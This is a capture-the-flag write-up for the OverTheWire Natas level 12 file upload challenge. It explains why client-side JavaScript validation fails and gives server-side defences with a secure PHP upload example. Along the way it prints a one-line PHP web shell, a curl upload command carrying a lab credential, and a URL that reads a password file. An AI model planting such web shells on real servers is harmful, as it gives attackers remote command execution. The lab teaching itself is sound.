12 File Upload — Client-Side Validation Bypass Hard

// Key Concepts

File Upload Client-Side Validation MIME Type Spoofing File Extension Bypass PHP Code Execution

// Challenge Overview

This level provides a file upload form that accepts JPEG images. However, the validation is done primarily on the client side using JavaScript. By bypassing the client-side validation, we can upload a PHP file that allows us to execute arbitrary code on the server.

// Initial Analysis

View the page source to see the client-side validation:

<form enctype="multipart/form-data" action="index.php" method="POST"> <input type="hidden" name="MAX_FILE_SIZE" value="1000"> <input type="file" name="uploadedfile" accept="image/jpeg"> <input type="submit" value="Upload File"> </form> <script> function validateFile() { var file = document.getElementById('uploadedfile').value; if (!file.match(/\.(jpg|jpeg)$/)) { alert("Only JPG files are allowed!"); return false; } return true; } </script>

The validation uses JavaScript to check the file extension. This can be easily bypassed.

💡 Client-side validation is only for user experience. It provides no real security — attackers can bypass it easily using tools like Burp Suite or by disabling JavaScript.

// Solution Walkthrough

Step 1 — Create a PHP file with a JPG extension:

# Create a file called shell.jpg with this content: <?php passthru($_GET['cmd']); ?>

Step 2 — Intercept the upload request with Burp Suite:

  1. Open Burp Suite and enable Intercept.
  2. Select the shell.jpg file in the upload form.
  3. Submit the form and intercept the request.
  4. Change the filename from shell.jpg to shell.php.
  5. Change the MIME type (optional — some servers check this too).
  6. Forward the request.

Step 3 — Alternatively, rename the file locally:

# Rename the file before uploading mv shell.jpg shell.php # Then upload shell.php directly

Step 4 — Access the uploaded PHP file:

http://natas12.natas.labs.overthewire.org/upload/shell.php?cmd=cat /etc/natas_webpass/natas13

Using curl to upload:

# Create the PHP file echo '<?php passthru($_GET["cmd"]); ?>' > shell.php # Upload with curl (filename can be changed in the request) curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 \ -F "MAX_FILE_SIZE=1000" \ -F "uploadedfile=@shell.php" \ http://natas12.natas.labs.overthewire.org/

// Why It Works

The file upload vulnerability exists because:

  • Client-side validation only: The server does not validate the file type.
  • No content validation: The server doesn't check the file contents.
  • Upload directory is accessible: Uploaded files can be accessed directly.
  • PHP execution enabled: The uploaded PHP file is executed by the server.

// Defensive Measures

  • Always validate on the server side.
  • Check the file extension and MIME type on the server.
  • Validate the file contents (e.g., use getimagesize() for images).
  • Store uploaded files outside the web root.
  • Rename uploaded files to random, unpredictable names.
  • Disable PHP execution in the upload directory using .htaccess.
  • Use a whitelist of allowed file types.

// Secure Upload Example

<?php $allowed_types = ['image/jpeg', 'image/png']; $allowed_exts = ['jpg', 'jpeg', 'png']; if ($_FILES['uploadedfile']['error'] != 0) { die("Upload error"); } $mime = mime_content_type($_FILES['uploadedfile']['tmp_name']); $ext = strtolower(pathinfo($_FILES['uploadedfile']['name'], PATHINFO_EXTENSION)); if (!in_array($mime, $allowed_types) || !in_array($ext, $allowed_exts)) { die("Invalid file type"); } // Generate random filename $new_filename = bin2hex(random_bytes(16)) . '.' . $ext; $upload_path = '/var/www/uploads/' . $new_filename; move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $upload_path); ?>

// Key Takeaways

📤 Client-Side Validation Is Not Security

File validation must happen on the server. Client-side checks can be easily bypassed.

🛡️ Validate Everything Server-Side

Check file type, content, size, and ensure the upload directory is properly secured.
